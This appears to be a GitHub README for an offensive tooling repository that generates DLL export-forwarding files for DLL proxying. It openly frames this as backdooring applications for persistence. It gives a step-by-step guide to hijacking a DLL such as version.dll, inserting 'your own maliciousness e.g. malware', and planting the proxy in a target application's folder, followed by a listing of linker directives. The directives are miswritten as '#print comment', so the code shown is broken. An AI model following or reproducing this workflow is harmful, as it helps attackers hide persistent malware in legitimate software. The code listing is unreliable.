# dll-exports
Collection of DLL function export forwards for DLL export function proxying.

Typical usecase is for backdooring applications for persistence purposes. E.g:

1. inspect the target application you wish to backdoor with procmon, see which DLLs it loads via the static IAT. You can clearly see this as the application tries to load Windows DLLs first from the applications own folder before attempting to load them from System32/SysWOW64.
2. pick one, a common target is `C:\Windows\System32\version.dll`
3. fire up Visual Studio, generate a new DLL project
4. add the code from here https://github.com/magnusstubman/dll-exports/blob/main/win10.19042/System32/version.dll.cpp
5. add your own maliciousness e.g. malware, e.g. as I did in https://dumpco.re/blog/alternative-to-lsass-dumping
6. compile - remember to compile for correct architecture
7. compy your newly compiled DLL to the target application's home directory
8. restart application and see it load your code, while preserving functionality


`generator.py` generates a list of DLLs in the target folders and use `pefile` to generate a list of exported functions for each, that are written to individual files containing relevant linker directives. E.g. for C:\Windows\System32\version.dll:


https://github.com/magnusstubman/dll-exports/blob/main/win10.19042/System32/version.dll.cpp
```c
#print comment(linker, "/export:GetFileVersionInfoA=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:GetFileVersionInfoByHandle=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:GetFileVersionInfoExA=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:GetFileVersionInfoExW=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:GetFileVersionInfoSizeA=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:GetFileVersionInfoSizeExA=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:GetFileVersionInfoSizeExW=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:GetFileVersionInfoSizeW=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:GetFileVersionInfoW=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:VerFindFileA=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:VerFindFileW=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:VerInstallFileA=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:VerInstallFileW=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:VerLanguageNameA=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:VerLanguageNameW=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:VerQueryValueA=\"C:\\Windows\\SysWOW64\\version.dll\"")
#print comment(linker, "/export:VerQueryValueW=\"C:\\Windows\\SysWOW64\\version.dll\"")
```

#### Note

I havn't taken `KnownDLLs` into account.
Keep in mind that the DLLs listed in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` *and any* DLL that they load is also considered to be a known DLL, thus the standard search order does not apply.


#### References

- https://silentbreaksecurity.com/adaptive-dll-hijacking/
